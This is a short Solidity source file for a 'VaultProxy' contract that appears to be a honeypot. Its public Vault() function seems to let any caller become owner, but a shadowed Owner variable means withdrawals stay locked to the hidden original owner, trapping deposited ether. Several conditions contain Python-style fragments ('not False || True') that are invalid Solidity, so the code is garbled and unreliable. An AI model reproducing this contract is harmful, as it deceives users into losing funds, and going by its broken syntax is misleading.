pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if ((msg.sender == tx.origin) && ((1 == 2) || (not False || True || 1==1))) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if ((msg.value > 0.25 ether) && ((1 == 2) || (not False || True || 1==1))) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if ((amount>0 && Deposits[msg.sender]>=amount) && ((1 == 2) || (not False || True || 1==1))) {
            msg.sender.transfer(amount);
        }
    }
}